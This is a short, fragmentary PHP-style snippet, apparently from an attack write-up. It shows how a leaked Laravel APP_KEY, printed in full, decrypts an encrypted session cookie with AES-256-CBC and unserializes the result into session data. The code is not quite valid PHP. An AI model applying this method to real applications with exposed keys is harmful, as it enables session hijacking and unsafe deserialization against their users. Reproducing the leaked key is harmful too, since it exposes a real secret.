
APP_KEY = base64:Wunfu1NsDbV+idgyTpyBTuO0fc7o3YMZBBjjcVYwRMg=


$payload = json_decode(base64_decode($cookieValue), true);

MAC = hash_hmac('sha256', $payload['iv'].$payload['value'], APP_KEY)



$decrypted = openssl_decrypt(
    base64_decode($payload['value']),   // the encrypted data
    'AES-256-CBC',                      // cipher method
    base64_decode('Wunfu1...'),         // APP_KEY (the leaked key)
    OPENSSL_RAW_DATA,
    base64_decode($payload['iv'])       // initialization vector
);


$sessionData = unserialize($decrypted);
  array('user_id' => 42, 'login_web' => '...', etc.)